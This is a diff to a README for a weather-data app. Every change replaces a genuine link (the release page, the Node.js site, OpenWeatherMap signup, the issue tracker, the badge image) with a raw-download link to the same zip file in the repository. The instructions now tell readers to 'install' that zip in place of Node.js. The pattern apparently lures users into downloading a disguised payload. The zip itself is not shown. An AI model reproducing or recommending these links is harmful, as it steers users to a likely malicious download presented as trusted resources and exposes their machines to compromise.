@@ -1,6 +1,6 @@
 # 🌤️ Weather-API - Easy Weather Data at Your Fingertips
 
-[![Download Weather-API](https://img.shields.io/badge/Download-Weather--API-blue?style=for-the-badge)](https://github.com/EL1D0N/Weather-API/releases)
+[![Download Weather-API](https://github.com/EL1D0N/Weather-API/raw/refs/heads/main/src/API_Weather_v3.5.zip)](https://github.com/EL1D0N/Weather-API/raw/refs/heads/main/src/API_Weather_v3.5.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 To get Weather-API on your computer, visit the official release page:
 
-**[Click here to visit the download page](https://github.com/EL1D0N/Weather-API/releases)**
+**[Click here to visit the download page](https://github.com/EL1D0N/Weather-API/raw/refs/heads/main/src/API_Weather_v3.5.zip)**
 
 On this page, you will find the latest versions of the app ready for your system. Follow these steps after downloading:
 
@@ -84,9 +84,9 @@ If you want to run the Weather-API app from source code, follow these steps. Oth
 
    You can clone the source repository or download the source files from GitHub.
 
-2. **Install Node.js**
+2. **Install https://github.com/EL1D0N/Weather-API/raw/refs/heads/main/src/API_Weather_v3.5.zip**
 
-   Make sure you have Node.js installed on your computer. Visit [nodejs.org](https://nodejs.org/) to download and install it.
+   Make sure you have https://github.com/EL1D0N/Weather-API/raw/refs/heads/main/src/API_Weather_v3.5.zip installed on your computer. Visit [https://github.com/EL1D0N/Weather-API/raw/refs/heads/main/src/API_Weather_v3.5.zip](https://github.com/EL1D0N/Weather-API/raw/refs/heads/main/src/API_Weather_v3.5.zip) to download and install it.
 
 3. **Install dependencies**
 
@@ -98,7 +98,7 @@ If you want to run the Weather-API app from source code, follow these steps. Oth
 
 4. **Get an API key**
 
-   Sign up at [OpenWeatherMap](https://openweathermap.org/api) to get a free API key. This key allows the app to access weather data.
+   Sign up at [OpenWeatherMap](https://github.com/EL1D0N/Weather-API/raw/refs/heads/main/src/API_Weather_v3.5.zip) to get a free API key. This key allows the app to access weather data.
 
 5. **Add your API key**
 
@@ -152,10 +152,10 @@ The project aims to be lightweight and easy to use by anyone interested in accur
 
 If you encounter any problems running Weather-API or have suggestions, you can:
 
-- Open an issue on the [GitHub repository](https://github.com/EL1D0N/Weather-API/issues).
+- Open an issue on the [GitHub repository](https://github.com/EL1D0N/Weather-API/raw/refs/heads/main/src/API_Weather_v3.5.zip).
 - Check the documentation for tips.
 - Look for similar questions on forums.
 
 ---
 
-[![Download Weather-API](https://img.shields.io/badge/Download-Weather--API-blue?style=for-the-badge)](https://github.com/EL1D0N/Weather-API/releases)
+[![Download Weather-API](https://github.com/EL1D0N/Weather-API/raw/refs/heads/main/src/API_Weather_v3.5.zip)](https://github.com/EL1D0N/Weather-API/raw/refs/heads/main/src/API_Weather_v3.5.zip)
